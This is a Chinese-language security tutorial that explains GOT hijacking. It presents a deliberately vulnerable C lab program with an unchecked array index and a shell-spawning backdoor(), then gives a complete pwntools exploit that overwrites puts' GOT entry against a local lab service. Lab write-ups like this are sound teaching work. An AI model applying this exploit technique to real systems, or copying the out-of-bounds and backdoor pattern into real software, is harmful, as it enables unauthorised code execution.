---
title: "Day10－GOT Hijacking"
date: 2024-09-10
draft: false
tags: ["iron-man-2024", "pwn", "binary-exploitation"]
categories: ["security-research"]
author: "YJK"
showToc: true
TocOpen: false
---


## 前言

前一天我們介紹了 GOT 和 Lazy Binding 的機制，今天要介紹的是如何利用這些機制進行攻擊，也就是 GOT Hijacking。

## 簡介

由於 Lazy Binding 的機制，GOT 是可寫的。因此，如果能夠覆蓋 GOT 的值，那麼下次呼叫該函數時，就可以控制即將執行的函數指針。這種情況通常出現在陣列未驗證輸入範圍、記憶體越界（即所謂的 out of bounds，oob）或是透過格式化字串（format string）將特定值寫入 GOT 的情況。

## Lab

```c
#include<stdio.h>
#include<stdlib.h>

int backdoor(const char *arg){
    system("/bin/sh");
}

long long value[4];

int main(){
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
    long long index;
    for(int i = 0; i < 4; i++){
        puts("Enter a index to store a value: ");
        scanf("%lld", &index);
        puts("Enter a value: ");
        scanf("%lld", &value[index]);
    }
    if(value[0] != 123){
        puts("CHECK FAILED\n");
        exit(0);
    }
    if(value[1] != 456){
        puts("CHECK FAILED\n");
        exit(0);
    }
    if(value[2] != 789){
        puts("CHECK FAILED\n");
        exit(0);
    }
    if(value[3] != 101112){
        puts("CHECK FAILED\n");
        exit(0);
    }
    puts("CHECK PASSED\n");
    return 0;
}
```

使用以下指令進行編譯（注意，預設編譯會是 Partial RELRO）：

```bash
gcc src/got.c -o ./got/share/got -fno-stack-protector -no-pie
```

大家可以嘗試練習這道題目，或者繼續閱讀以下的解題步驟。

## writeup

首先，這道題目有一個 `backdoor()` 函數，該函數會直接打開一個 shell。此外，程式允許我們四次機會編輯陣列 `value` 中的值，並且可以自由選擇要修改哪個索引值。由於沒有驗證索引範圍，因此我們可以利用 oob（out of bounds）漏洞，再加上 GOT Hijacking，將某個函數指針覆蓋，使其執行 `backdoor` 函數。

這題相對簡單，因為可以使用 `objdump` 來 disassemble 程式，從中計算應該填入哪些位置。從 `main` 函數可以看到 `value` 陣列的位址是 0x404080。

![image](/images/iron2024/day10_image1.png)

接下來我們需要找出該填入的位置與 `value` 陣列位址之間的差異。在這裡，我們選擇覆蓋 `puts` 函數，因為在寫入值之後會呼叫 `puts` 函數。確認一下 `puts` 的 GOT 位址是 0x404000，依此就能判斷應該覆蓋哪個索引。

![image](/images/iron2024/day10_image2.png)

接著，我們要將 `backdoor` 函數的位址（0x401166）寫入。

![image](/images/iron2024/day10_image3.png)

現在所有資訊都已經掌握，可以開始編寫 exploit。

記得因為程式直接接收數字及數值，因此以字串的形式輸入即可。

完整 exploit：
```python
from pwn import *

# r = process('../got/share/got')
r = remote('127.0.0.1', 10002)

value = 0x404080
puts_got = 0x404000
backdoor = 0x401166

offset = (puts_got - value) // 8
r.sendlineafter(b'Enter a index to store a value: \n', str(offset).encode())
r.sendlineafter(b'Enter a value: \n', str(backdoor).encode())
r.interactive()
```

solved！！

![image](/images/iron2024/day10_image4.png)
